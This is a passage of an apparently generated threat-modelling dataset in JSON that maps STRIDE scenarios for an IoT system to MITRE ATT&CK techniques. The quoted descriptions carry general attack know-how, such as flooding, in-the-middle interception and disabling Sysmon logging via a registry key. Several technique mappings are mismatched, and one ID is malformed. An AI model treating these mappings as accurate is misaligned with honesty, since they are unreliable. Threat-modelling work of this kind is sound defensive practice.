                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker floods the network with traffic, causing legitimate sensors and actuators to be unresponsive.",
            "Assumptions": [
                {
                    "Assumption": "The network lacks traffic filtering mechanisms",
                    "Role": "System Administrator",
                    "Condition": "No traffic rate limiting"
                },
                {
                    "Assumption": "No distributed denial-of-service protection in place",
                    "Role": "Security Team",
                    "Condition": "Lack of DDoS mitigation tools"
                },
                {
                    "Assumption": "Sensors and actuators can be overwhelmed by excessive traffic",
                    "Role": "Developer",
                    "Condition": "Insufficient resources to handle high traffic"
                }
            ],
            "Potential Impact": "Disruption of system operations, degradation of user experience",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "traffic flood",
                "network",
                "availability"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker exploits vulnerabilities in user devices to launch a distributed denial-of-service (DDoS) attack on the central system.",
            "Assumptions": [
                {
                    "Assumption": "Vulnerabilities exist in user devices",
                    "Role": "Developer",
                    "Condition": "Unpatched software on user devices"
                },
                {
                    "Assumption": "No multi-layer security on user devices",
                    "Role": "User",
                    "Condition": "Lack of endpoint security solutions"
                },
                {
                    "Assumption": "Central system lacks robust defenses against DDoS attacks",
                    "Role": "System Administrator",
                    "Condition": "Inadequate DDoS protection"
                }
            ],
            "Potential Impact": "Complete system outage, prevention of legitimate user access",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "DDoS",
                "user device",
                "central system"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker sabotages the AI/ML models by providing them with nonsensical data, leading to system misbehavior and potential shutdown.",
            "Assumptions": [
                {
                    "Assumption": "AI/ML models accept external input without validation",
                    "Role": "Developer",
                    "Condition": "Weak input validation mechanisms"
                },
                {
                    "Assumption": "Lack of monitoring for abnormal data patterns",
                    "Role": "Security Team",
                    "Condition": "No anomaly detection in place"
                },
                {
                    "Assumption": "Attackers have the capability to generate malicious data",
                    "Role": "Attacker",
                    "Condition": "Access to methods to produce and inject data"
                }
            ],
            "Potential Impact": "System reliability is compromised, potential for automated shutdowns or failures",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "AI/ML sabotage",
                "data integrity",
                "machine learning"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--35bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a vulnerability in the authentication mechanism to gain administrative access to the AmI system.",
            "Assumptions": [
                {
                    "Assumption": "Presence of a vulnerability in the authentication process",
                    "Role": "Developer",
                    "Condition": "Unpatched or insecure authentication logic"
                },
                {
                    "Assumption": "No monitoring for abnormal access patterns",
                    "Role": "Security Team",
                    "Condition": "Lack of access pattern analytics"
                },
                {
                    "Assumption": "Attacker has initial foothold or compromised low-privilege account",
                    "Role": "Attacker",
                    "Condition": "Initial access already obtained"
                }
            ],
            "Potential Impact": "Gain full control over system operations, potential for mass data manipulation and extraction",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "authentication bypass",
                "administrative access",
                "system control"
            ],
            "mitre_technique": {
                "name": "Cloud Administration Command",
                "description": "Adversaries may abuse cloud management services to execute commands within virtual machines. Resources such as AWS Systems Manager, Azure RunCommand, and Runbooks allow users to remotely run scripts in virtual machines by leveraging installed virtual machine agents. (Citation: AWS Systems Manager Run Command)(Citation: Microsoft Run Command)\n\nIf an adversary gains administrative access to a cloud environment, they may be able to abuse cloud management services to execute commands in the environment\u2019s virtual machines. Additionally, an adversary that compromises a service provider or delegated administrator account may similarly be able to leverage a [Trusted Relationship](https://attack.mitre.org/techniques/T1199) to execute commands in connected virtual machines.(Citation: MSTIC Nobelium Oct 2021)",
                "id": "attack-pattern--d94b3ae9-8059-4989-8e9f-ea0f601f80a7",
                "technique_id": "T1651"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker uses a compromised smart card to elevate privileges within the system.",
            "Assumptions": [
                {
                    "Assumption": "Smart card credential could be cloned or stolen",
                    "Role": "Attacker",
                    "Condition": "Physical access or insider threat"
                },
                {
                    "Assumption": "Weak validation process for smart card credentials",
                    "Role": "System Administrator",
                    "Condition": "Inadequate smart card authenticity checks"
                },
                {
                    "Assumption": "Smart cards are used for high-privilege access",
                    "Role": "Developer",
                    "Condition": "Smart cards assigned high-privilege roles"
                }
            ],
            "Potential Impact": "Full control over system settings and data, ability to bypass regular access controls",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "smart card",
                "credential hijacking",
                "system access"
            ],
            "mitre_technique": {
                "name": "Use Alternate Authentication Material",
                "description": "Adversaries may use alternate authentication material, such as password hashes, Kerberos tickets, and application access tokens, in order to move laterally within an environment and bypass normal system access controls. \n\nAuthentication processes generally require a valid identity (e.g., username) along with one or more authentication factors (e.g., password, pin, physical smart card, token generator, etc.). Alternate authentication material is legitimately generated by systems after a user or application successfully authenticates by providing a valid identity and the required authentication factor(s). Alternate authentication material may also be generated during the identity creation process.(Citation: NIST Authentication)(Citation: NIST MFA)\n\nCaching alternate authentication material allows the system to verify an identity has successfully authenticated without asking the user to reenter authentication factor(s). Because the alternate authentication must be maintained by the system\u2014either in memory or on disk\u2014it may be at risk of being stolen through [Credential Access](https://attack.mitre.org/tactics/TA0006) techniques. By stealing alternate authentication material, adversaries are able to bypass system access controls and authenticate to systems without knowing the plaintext password or any additional authentication factors.\n",
                "id": "attack-pattern--51a14c76-dd3b-440b-9c20-2bf91d25a814",
                "technique_id": "T1550"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits vulnerabilities in user device software to gain elevated privileges and access to the central system.",
            "Assumptions": [
                {
                    "Assumption": "Software on user devices contains vulnerabilities",
                    "Role": "Developer",
                    "Condition": "Unpatched or outdated software"
                },
                {
                    "Assumption": "Lack of robust endpoint security measures",
                    "Role": "User",
                    "Condition": "Absence of security software or precautionary measures"
                },
                {
                    "Assumption": "Poor network segmentation allows lateral movement",
                    "Role": "System Administrator",
                    "Condition": "Weak network segmentation controls"
                }
            ],
            "Potential Impact": "Unauthorized system-wide control, data access and manipulation",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "exploitation",
                "user device",
                "network segmentation"
            ],
            "mitre_technique": {
                "name": "Network Boundary Bridging",
                "description": "Adversaries may bridge network boundaries by compromising perimeter network devices or internal devices responsible for network segmentation. Breaching these devices may enable an adversary to bypass restrictions on traffic routing that otherwise separate trusted and untrusted networks.\n\nDevices such as routers and firewalls can be used to create boundaries between trusted and untrusted networks.  They achieve this by restricting traffic types to enforce organizational policy in an attempt to reduce the risk inherent in such connections.  Restriction of traffic can be achieved by prohibiting IP addresses, layer 4 protocol ports, or through deep packet inspection to identify applications.  To participate with the rest of the network, these devices can be directly addressable or transparent, but their mode of operation has no bearing on how the adversary can bypass them when compromised.\n\nWhen an adversary takes control of such a boundary device, they can bypass its policy enforcement to pass normally prohibited traffic across the trust boundary between the two separated networks without hinderance.  By achieving sufficient rights on the device, an adversary can reconfigure the device to allow the traffic they want, allowing them to then further achieve goals such as command and control via [Multi-hop Proxy](https://attack.mitre.org/techniques/T1090/003) or exfiltration of data via [Traffic Duplication](https://attack.mitre.org/techniques/T1020/001). Adversaries may also target internal devices responsible for network segmentation and abuse these in conjunction with [Internal Proxy](https://attack.mitre.org/techniques/T1090/001) to achieve the same goals.(Citation: Kaspersky ThreatNeedle Feb 2021)  In the cases where a border device separates two separate organizations, the adversary can also facilitate lateral movement into new victim environments.",
                "id": "attack-pattern--b8017880-4b1e-42de-ad10-ae7ac6705166",
                "technique_id": "T1599"
            }
        }
    ]
},
{
    "case_number": "7",
    "batch_number": "28",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker uses phishing to steal user credentials for accessing the IoT application and masquerades as a legitimate user.",
            "Assumptions": [
                {
                    "Assumption": "User credentials are stored insecurely or transmitted without encryption.",
                    "Role": "Attacker",
                    "Condition": "Credentials are vulnerable to interception."
                },
                {
                    "Assumption": "Users frequently use the same passwords across different services.",
                    "Role": "User",
                    "Condition": "Password reuse across multiple sites."
                },
                {
                    "Assumption": "The system lacks multi-factor authentication.",
                    "Role": "System Administrator",
                    "Condition": "Only single-factor authentication is in place."
                }
            ],
            "Potential Impact": "Unauthorized access to user data, potential data breaches, and unauthorized control of IoT devices.",
            "MITRE ATT&CK Keywords": [
                "phishing",
                "credibility",
                "stolen credentials",
                "masquerading"
            ],
            "mitre_technique": {
                "name": "Spearphishing Link",
                "description": "Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments. \n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging [User Execution](https://attack.mitre.org/techniques/T1204). The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place. Adversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly or verify the receipt of an email (i.e. web bugs/web beacons). Links may also direct users to malicious applications  designed to [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s, like OAuth tokens, in order to gain access to protected applications and information.(Citation: Trend Micro Pawn Storm OAuth 2017)",
                "id": "attack-pattern--20138b9d-1aac-4a26-8654-a36b6bbf2bba",
                "technique_id": "T1192"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker compromises a communication router or gateway to intercept and modify data being sent between sensors and the central system.",
            "Assumptions": [
                {
                    "Assumption": "Network traffic is not encrypted or is weakly encrypted.",
                    "Role": "Attacker",
                    "Condition": "Ability to intercept unencrypted traffic."
                },
                {
                    "Assumption": "The attacker has physical or remote access to the networking hardware.",
                    "Role": "Attacker",
                    "Condition": "Access to networking equipment."
                },
                {
                    "Assumption": "The network security policies are insufficiently enforced.",
                    "Role": "Network Administrator",
                    "Condition": "Weak network security policies"
                }
            ],
            "Potential Impact": "Unauthorized data interception leading to potential data breaches and manipulated sensor data.",
            "MITRE ATT&CK Keywords": [
                "compromise",
                "man-in-the-middle",
                "data interception",
                "network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker uses fake biometric data to bypass biometric authentication on user devices that interact with the IoT application.",
            "Assumptions": [
                {
                    "Assumption": "Biometric data can be easily spoofed or replicated.",
                    "Role": "Attacker",
                    "Condition": "Reproducible biometric features."
                },
                {
                    "Assumption": "No liveness detection is implemented in the biometric system.",
                    "Role": "System Designer",
                    "Condition": "Lack of advanced biometric validation procedures."
                },
                {
                    "Assumption": "Users are not aware of the importance of protecting their biometric data.",
                    "Role": "User",
                    "Condition": "User negligence in biometric data protection."
                }
            ],
            "Potential Impact": "Unauthorized access to user accounts, data breaches, and potential unauthorized actions within the system.",
            "MITRE ATT&CK Keywords": [
                "biometric authentication",
                "spoofing",
                "fake data",
                "user devices"
            ],
            "mitre_technique": {
                "name": "GUI Input Capture",
                "description": "Adversaries may mimic common operating system GUI components to prompt users for credentials with a seemingly legitimate prompt. When programs are executed that need additional privileges than are present in the current user context, it is common for the operating system to prompt the user for proper credentials to authorize the elevated privileges for the task (ex: [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002)).\n\nAdversaries may mimic this functionality to prompt users for credentials with a seemingly legitimate prompt for a number of reasons that mimic normal usage, such as a fake installer requiring additional access or a fake malware removal suite.(Citation: OSX Malware Exploits MacKeeper) This type of prompt can be used to collect credentials via various languages such as [AppleScript](https://attack.mitre.org/techniques/T1059/002)(Citation: LogRhythm Do You Trust Oct 2014)(Citation: OSX Keydnap malware)(Citation: Spoofing credential dialogs) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).(Citation: LogRhythm Do You Trust Oct 2014)(Citation: Enigma Phishing for Credentials Jan 2015)(Citation: Spoofing credential dialogs) On Linux systems adversaries may launch dialog boxes prompting users for credentials from malicious shell scripts or the command line (i.e. [Unix Shell](https://attack.mitre.org/techniques/T1059/004)).(Citation: Spoofing credential dialogs)\n\nAdversaries may also mimic common software authentication requests, such as those from browsers or email clients. This may also be paired with user activity monitoring (i.e., [Browser Information Discovery](https://attack.mitre.org/techniques/T1217) and/or [Application Window Discovery](https://attack.mitre.org/techniques/T1010)) to spoof prompts when users are naturally accessing sensitive sites/data.",
                "id": "attack-pattern--a2029942-0a85-4947-b23c-ca434698171d",
                "technique_id": "T1056.002"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker gains physical access to IoT sensors and alters the firmware to send manipulated data to the central system.",
            "Assumptions": [
                {
                    "Assumption": "Sensors are installed in locations with inadequate physical security.",
                    "Role": "Building Manager",
                    "Condition": "Poor physical security measures."
                },
                {
                    "Assumption": "Firmware updates are not cryptographically verified.",
                    "Role": "System Developer",
                    "Condition": "Lack of cryptographic verification for firmware updates."
                },
                {
                    "Assumption": "Admin access controls for firmware updates are weak.",
                    "Role": "System Administrator",
                    "Condition": "Weak access control mechanisms."
                }
            ],
            "Potential Impact": "Integrity of data is compromised, leading to incorrect system decisions and potential safety issues.",
            "MITRE ATT&CK Keywords": [
                "tamper",
                "firmware modification",
                "sensor",
                "physical access"
            ],
            "mitre_technique": {
                "name": "Disable or Modify Tools",
                "description": "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.(Citation: SCADAfence_ransomware)\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.(Citation: OutFlank System Calls)(Citation: MDSec System Calls) \n\nAdversaries may also focus on specific applications such as Sysmon. For example, the \u201cStart\u201d and \u201cEnable\u201d values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging.(Citation: disable_win_evt_logging) \n\nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)(Citation: Analysis of FG-IR-22-369)\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools.(Citation: chasing_avaddon_ransomware)(Citation: dharma_ransomware)(Citation: demystifying_ryuk)(Citation: doppelpaymer_crowdstrike) For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.(Citation: demystifying_ryuk)\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)), which may lead to bypassing anti-tampering features.(Citation: avoslocker_ransomware)",
                "id": "attack-pattern--ac08589e-ee59-4935-8667-d845e38fe579",
                "technique_id": "T1562.001"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker exploits a vulnerability in the communication infrastructure to inject false commands into the actuator control signals.",
            "Assumptions": [
                {
                    "Assumption": "A vulnerability exists in the communication protocols used by the system.",
                    "Role": "System Developer",
                    "Condition": "Undiscovered or unpatched vulnerabilities."
                },
                {
                    "Assumption": "Access controls for control signals are weak.",
                    "Role": "Network Administrator",
                    "Condition": "Weak or missing access controls."
                },
                {
                    "Assumption": "The system does not adequately monitor or log actuator commands.",
                    "Role": "System Administrator",
                    "Condition": "Lack of monitoring or logging."
                }
            ],
            "Potential Impact": "Actuator actions are compromised, causing potential physical damages or safety hazards.",
            "MITRE ATT&CK Keywords": [
                "command injection",
                "actuator",
                "communication infrastructure",
                "control signal"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies stored data or AI/ML model parameters in the data repositories to produce incorrect analytics and decisions.",
            "Assumptions": [
                {
                    "Assumption": "Data repositories are not adequately secured against unauthorized access.",
                    "Role": "Database Administrator",
                    "Condition": "Inadequate repository security."
                },
                {
                    "Assumption": "AI/ML models have insufficient validation or integrity checks.",
                    "Role": "AI/ML Developer",
                    "Condition": "Lack of integrity checks."
                },
                {
                    "Assumption": "User roles and permissions are poorly managed.",
                    "Role": "System Administrator",
                    "Condition": "Improper role and permission management."
                }
            ],
            "Potential Impact": "Data integrity is compromised, causing incorrect decisions or actions based on tampered data.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "data integrity",
                "AI/ML models",
                "repositories"
            ],
            "mitre_technique": {
                "name": "Data from Configuration Repository",
                "description": "Adversaries may collect data related to managed devices from configuration repositories. Configuration repositories are used by management systems in order to configure, manage, and control data on remote systems. Configuration repositories may also facilitate remote access and administration of devices.\n\nAdversaries may target these repositories in order to collect large quantities of sensitive system administration data. Data from configuration repositories may be exposed by various protocols and software and can store a wide variety of data, much of which may align with adversary Discovery objectives.(Citation: US-CERT-TA18-106A)(Citation: US-CERT TA17-156A SNMP Abuse 2017)",
                "id": "attack-pattern--0ad7bc5c-235a-4048-944b-3b286676cb74",
                "technique_id": "T1602"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user performs unauthorized actions on the system, such as altering system configurations, and denies involvement.",
            "Assumptions": [
                {
                    "Assumption": "System actions are not sufficiently logged.",
                    "Role": "System Administrator",
                    "Condition": "Insufficient logging mechanisms."
                },
                {
                    "Assumption": "Logs are not protected from tampering.",
                    "Role": "System Developer",
                    "Condition": "Insecure log storage."
                },
                {
                    "Assumption": "System lacks a mechanism for non-repudiation.",
                    "Role": "System Designer",
                    "Condition": "Absence of non-repudiation mechanisms."
                }
            ],
            "Potential Impact": "Unauthorized changes and difficulty in tracking or attributing actions, leading to security and operational issues.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "unauthorized actions",
                "configuration changes",
                "logging"
            ],
            "mitre_technique": {
                "name": "Clear Linux or Mac System Logs",
                "description": "Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs)\n\n* <code>/var/log/messages:</code>: General and system-related messages\n* <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs\n* <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records\n* <code>/var/log/kern.log</code>: Kernel logs\n* <code>/var/log/cron.log</code>: Crond logs\n* <code>/var/log/maillog</code>: Mail server logs\n* <code>/var/log/httpd/</code>: Web server access and error logs\n",
                "id": "attack-pattern--2bce5b30-7014-4a5d-ade7-12913fe6ac36",
                "technique_id": "T1070.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A third-party software component in the AmI system performs an action that is not logged properly, making it difficult to trace.",
            "Assumptions": [
                {
                    "Assumption": "Third-party software components are trusted without thorough vetting.",
                    "Role": "System Architect",
                    "Condition": "Improper vetting of third-party components."
                },
                {
                    "Assumption": "Logging mechanisms are not universally enforced across all components.",
                    "Role": "System Administrator",
                    "Condition": "Inconsistent logging practices."
                },
                {
                    "Assumption": "Dependencies and interactions between components are not well-documented.",
                    "Role": "System Developer",
                    "Condition": "Lack of thorough documentation."
                }
            ],
            "Potential Impact": "Actions become untraceable causing difficulties in auditing and forensic analysis if something goes wrong.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "third-party software",
                "unlogged actions",
                "forensic analysis"
            ],
            "mitre_technique": {
                "name": "Indicator Removal",
                "description": "Adversaries may delete or modify artifacts generated within systems to remove evidence of their presence or hinder defenses. Various artifacts may be created by an adversary or something that can be attributed to an adversary\u2019s actions. Typically these artifacts are used as defensive indicators related to monitored events, such as strings from downloaded files, logs that are generated from user actions, and other data analyzed by defenders. Location, format, and type of artifact (such as command or login history) are often specific to each platform.\n\nRemoval of these indicators may interfere with event collection, reporting, or other processes used to detect intrusion activity. This may compromise the integrity of security solutions by causing notable events to go unreported. This activity may also impede forensic analysis and incident response, due to lack of sufficient data to determine what occurred.",
                "id": "attack-pattern--799ace7f-e227-4411-baa0-8868704f2a69",
                "technique_id": "T1070"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A malicious insider deletes or alters logs to cover their tracks after gaining unauthorized access.",
            "Assumptions": [
                {
                    "Assumption": "Individuals have broad access to critical system components and logs.",
                    "Role": "System Administrator",
                    "Condition": "Broader access permissions."
                },
                {
                    "Assumption": "Logs are not backed up in real-time or regularly.",
                    "Role": "System Designer",
                    "Condition": "No real-time backup."
                },
                {
                    "Assumption": "The system lacks tamper-evident logging mechanisms.",
                    "Role": "System Developer",
                    "Condition": "Logs can be altered without detection."
                }
            ],
            "Potential Impact": "Loss of audit trail, making it difficult to detect and respond to unauthorized activities.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "insider threat",
                "log tampering",
                "audit trail"
            ],
            "mitre_technique": {
                "name": "Kernel Modules and Extensions",
                "description": "Loadable Kernel Modules (or LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system. (Citation: Linux Kernel Programming)\u00a0When used maliciously, Loadable Kernel Modules (LKMs) can be a type of kernel-mode [Rootkit](https://attack.mitre.org/techniques/T1014) that run with the highest operating system privilege (Ring 0). (Citation: Linux Kernel Module Programming Guide)\u00a0Adversaries can use loadable kernel modules to covertly persist on a system and evade defenses. Examples have been found in the wild and there are some open source projects. (Citation: Volatility Phalanx2) (Citation: CrowdStrike Linux Rootkit) (Citation: GitHub Reptile) (Citation: GitHub Diamorphine)\n\nCommon features of LKM based rootkits include: hiding itself, selective hiding of files, processes and network activity, as well as log tampering, providing authenticated backdoors and enabling root access to non-privileged users. (Citation: iDefense Rootkit Overview)\n\nKernel extensions, also called kext, are used for macOS to load functionality onto a system similar to LKMs for Linux. They are loaded and unloaded through <code>kextload</code> and <code>kextunload</code> commands. Several examples have been found where this can be used. (Citation: RSAC 2015 San Francisco Patrick Wardle) (Citation: Synack Secure Kernel Extension Broken) Examples have been found in the wild. (Citation: Securelist Ventir)",
                "id": "attack-pattern--6be14413-578e-46c1-8304-310762b3ecd5",
                "technique_id": "T1215"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "A third-party contractor gains unauthorized access to sensitive data stored in the cloud due to insufficient access controls.",
            "Assumptions": [
                {
                    "Assumption": "Cloud storage access controls are not properly configured.",
                    "Role": "Cloud Service Administrator",
                    "Condition": "Misconfigured access controls."
                },
                {
                    "Assumption": "Sensitive data is not encrypted at rest.",
                    "Role": "Data Manager",
                    "Condition": "Lack of encryption for stored data."
                },
                {
                    "Assumption": "Role-based access controls are not enforced.",
                    "Role": "System Administrator",
                    "Condition": "Improper role-based access management."
                }
            ],
            "Potential Impact": "Potential unauthorized disclosure of sensitive information, resulting in privacy breaches and compliance issues.",
            "MITRE ATT&CK Keywords": [
                "data exposure",
                "cloud storage",
                "unauthorized access",
                "sensitive data"
            ],
            "mitre_technique": {
                "name": "Data from Cloud Storage",
                "description": "Adversaries may access data from cloud storage.\n\nMany IaaS providers offer solutions for online data object storage such as Amazon S3, Azure Storage, and Google Cloud Storage. Similarly, SaaS enterprise platforms such as Office 365 and Google Workspace provide cloud-based document storage to users through services such as OneDrive and Google Drive, while SaaS application providers such as Slack, Confluence, Salesforce, and Dropbox may provide cloud storage solutions as a peripheral or primary use case of their platform. \n\nIn some cases, as with IaaS-based cloud storage, there exists no overarching application (such as SQL or Elasticsearch) with which to interact with the stored objects: instead, data from these solutions is retrieved directly though the [Cloud API](https://attack.mitre.org/techniques/T1059/009). In SaaS applications, adversaries may be able to collect this data directly from APIs or backend cloud storage objects, rather than through their front-end application or interface (i.e., [Data from Information Repositories](https://attack.mitre.org/techniques/T1213)). \n\nAdversaries may collect sensitive data from these cloud storage solutions. Providers typically offer security guides to help end users configure systems, though misconfigurations are a common problem.(Citation: Amazon S3 Security, 2019)(Citation: Microsoft Azure Storage Security, 2019)(Citation: Google Cloud Storage Best Practices, 2019) There have been numerous incidents where cloud storage has been improperly secured, typically by unintentionally allowing public access to unauthenticated users, overly-broad access by all users, or even access for any anonymous person outside the control of the Identity Access Management system without even needing basic user permissions.\n\nThis open access may expose various types of sensitive data, such as credit cards, personally identifiable information, or medical records.(Citation: Trend Micro S3 Exposed PII, 2017)(Citation: Wired Magecart S3 Buckets, 2019)(Citation: HIPAA Journal S3 Breach, 2017)(Citation: Rclone-mega-extortion_05_2021)\n\nAdversaries may also obtain then abuse leaked credentials from source repositories, logs, or other means as a way to gain access to cloud storage objects.",
                "id": "attack-pattern--3298ce88-1628-43b1-87d9-0b5336b193d7",
                "technique_id": "T1530"
            }
        },
        {
            "Threat Type": "Information Disclosure",
